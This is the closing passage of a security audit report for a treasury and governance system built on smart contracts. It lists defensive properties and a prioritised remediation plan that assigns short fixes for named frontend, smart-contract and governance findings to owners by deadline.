| DEF-08 | Timelock enforces governance delay on all treasury operations | Integration tests |
| DEF-09 | `proposalCleaned` flag prevents double-cleanup | Code review |
| DEF-10 | Emergency spending limit resets per-period, not per-call | Code review |

---

## Prioritised Remediation Plan

### Immediate (Before Production Launch)

| # | Finding | Action | Owner |
|---|---------|--------|-------|
| 1 | FE-03 Session Secret Fallback | Add fail-fast check, rotate secret in all envs | Backend |
| 2 | SC-01 DuesLending Interface Mismatch | Add 3 missing functions to FaircroftTreasury | Smart contract |
| 3 | FE-02 Violation PATCH No Board Check | Add board membership guard | Backend |
| 4 | SC-04 Restructured Loan Unrepayable | Add `Restructured` to repayment guard | Smart contract |
| 5 | SC-11 Vendor == Inspector | Add `inspector != vendor` check | Smart contract |

### Before First User Transaction (Week 1)

| # | Finding | Action | Owner |
|---|---------|--------|-------|
| 6 | SC-05 VendorEscrow Accounting | Add `creditFromEscrow()` to Treasury | Smart contract |
| 7 | SC-02/SC-03 Governor bypass+DoS | Override `propose()` with counter | Smart contract |
| 8 | FE-01 SIWE Domain Binding | Pass domain to verify() | Backend |
| 9 | FE-05 link-wallet Arbitrary Address | Use authenticated address only | Backend |
| 10 | FE-06 DOMPurify style Attribute | Remove `style` from ALLOWED_ATTR | Frontend |

### Within 30 Days

| # | Finding | Action | Owner |
|---|---------|--------|-------|
| 11 | FE-04 In-Memory Rate Limiter | Migrate to Upstash Redis | Backend |
| 12 | SC-06 Risk Cap Shrinking Reserve | Fix denominator to include deployed | Smart contract |
| 13 | SC-07 Abstain Quorum Exploit | Revise `_voteSucceeded` denominator | Smart contract |
| 14 | SC-10 totalOutstanding Overstated | Decrement per payment | Smart contract |
| 15 | SC-09 supersedes=0 Ambiguity | Switch to 1-indexed doc IDs | Smart contract |

### Longer Term

| # | Finding | Action | Owner |
|---|---------|--------|-------|
| 16 | SC-08 Soulbound governance risk | Require Constitutional vote for transfer policy | Governance |
| 17 | AI-02 Deepfake documents | Multi-sig RECORDER requirement | Governance |
| 18 | ECON-04 Vendor milestone griefing | Inspector override window | Smart contract |
| 19 | Q-01 Quantum threats | Monitor PQ Ethereum standards | Architecture |
| 20 | INF-01 Third-party compromise | Webhook signature verification | DevOps |

---

*Report generated: 2026-04-06 | Next audit recommended: before mainnet launch*
